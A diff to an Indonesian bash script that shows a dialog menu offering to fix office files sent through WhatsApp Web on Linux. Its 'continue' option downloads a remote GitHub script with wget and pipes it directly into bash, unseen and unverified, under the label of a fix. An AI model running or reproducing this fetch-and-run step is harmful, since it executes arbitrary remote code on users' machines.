@@ -1,13 +1,41 @@
 #!/bin/bash
 
-echo "Pilih salah satu:"
-echo "1. Lanjutkan"
-echo "2. Exit"
+# INI MENU PILIHAN
+HEIGHT=12
+WIDTH=80
+CHOICE_HEIGHT=2
+TITLE="DESKRIPSI"
+MENU="
+Fix ini di tujukan buat kalian yang pada saat mengirim file word, excel, ppt melalui WA web di linux tidak dapat dibuka oleh HP teman lain.
+Dengan fix ini akan memperbaiki itu.
+"
 
-read pilihan
+# INI MENU AWAL
+OPTIONS=(
+1 "Lanjut fix"
+2 "Batalkan")
 
-if [ "$pilihan" -eq 1 ]; then
-  echo "Halo!"
-else
-  exit
-fi
+CHOICE=$(dialog --clear \
+                --backtitle "$BACKTITLE" \
+                --title "$TITLE" \
+                --menu "$MENU" \
+                $HEIGHT $WIDTH $CHOICE_HEIGHT \
+                "${OPTIONS[@]}" \
+                2>&1 >/dev/tty)
+
+clear
+case $CHOICE in
+
+‎ )
+exit
+;;
+
+1)
+wget -O - https://raw.githubusercontent.com/panjiades/Update-3/refs/heads/main/Gimpscape1 | bash
+;;
+
+2)
+exit
+;;
+
+esac
